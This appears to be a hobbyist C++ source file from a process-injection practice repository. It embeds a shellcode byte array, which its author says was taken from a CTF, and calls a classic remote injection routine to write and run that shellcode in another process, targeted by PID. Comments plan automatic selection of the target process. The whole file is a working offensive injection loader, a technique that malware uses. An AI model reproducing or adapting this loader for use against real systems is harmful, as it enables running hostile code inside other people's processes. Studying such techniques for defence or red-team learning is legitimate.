// if u cant tell this is the sc
#include "classic_remote_injection.h"
#include <iostream>

// u see i could have used donut for sc conversion but thats a practice for another day
// just wanna get em basic done 

// wannabe sc. ngl i copied this from some random sc from a random ctf i solved a while bac

unsigned char my_stolen_shellcode_from_a_ctf[] = {
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0xC7, 0xC1, 0x00,
    0x00, 0x00, 0x00, 0x48, 0xC7, 0xC2, 0x00, 0x00, 0x00, 0x00, 0x4D, 0x31,
    0xC0, 0x65, 0x48, 0x8B, 0x40, 0x60, 0x48, 0x8B, 0x78, 0x18, 0x48, 0x8B,
    0x77, 0x20, 0x48, 0x8B, 0x3F, 0x48, 0x01, 0xFB, 0x49, 0x8B, 0x5F, 0x30,
    0x48, 0x01, 0xFB, 0x8B, 0x48, 0x24, 0x4C, 0x01, 0xF9, 0x41, 0x8B, 0x3C,
    0x8B, 0x48, 0x01, 0xF7, 0x49, 0x8B, 0x7F, 0x20, 0x48, 0x01, 0xF7, 0x41,
    0x8B, 0x47, 0x3C, 0x4C, 0x01, 0xF8, 0x41, 0x8B, 0x4F, 0x18, 0x4C, 0x01,
    0xF9, 0x41, 0x8B, 0x57, 0x20, 0x4C, 0x01, 0xFA, 0x44, 0x8B, 0x04, 0xAF,
    0x49, 0x01, 0xF8, 0x41, 0x8B, 0x47, 0x24, 0x4C, 0x01, 0xF8, 0x41, 0x0F,
    0xB7, 0x57, 0x22, 0x49, 0x8D, 0x1C, 0x2F, 0x49, 0x8B, 0x5F, 0x20, 0x48,
    0x01, 0xFB, 0x44, 0x8B, 0x0C, 0x8B, 0x49, 0x01, 0xF9, 0x48, 0x31, 0xC0,
    0x48, 0x83, 0xC4, 0x28, 0xC3, 0x48, 0x8B, 0x04, 0x24, 0x48, 0x89, 0xC3,
    0x48, 0x8B, 0x03, 0x48, 0xFF, 0xE0, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x89,
    0xE2, 0x48, 0x83, 0xE4, 0xF0, 0x41, 0xFF, 0xD0, 0x48, 0x83, 0xC4, 0x28,
    0xC3
};

int main() {

    //idk i should make a fancy menu selection to select what type of injection cuz this repo should have 5 but we ball with this "
    std::cout << "Bepp Bopp starting classic injection" << std::endl;

    // Calculate the size of the sc
    size_t shellcode_size = sizeof(my_stolen_shellcode_from_a_ctf);

    //function call 
    // put random pid 
    // idk should i automate the pid finder ehhhhh lets do it 

    //-------------------------------------
    // to-do find a way to automate pid finder
    // get all running process and list them out
    // let user select the pid of the target process
    // then pass that pid to the function call below
    //------------------------------------------

    classic_remote_injection(my_stolen_shellcode_from_a_ctf, shellcode_size, 1234);

    std::cout << "Well it's done  " << std::endl;
    return 0;
}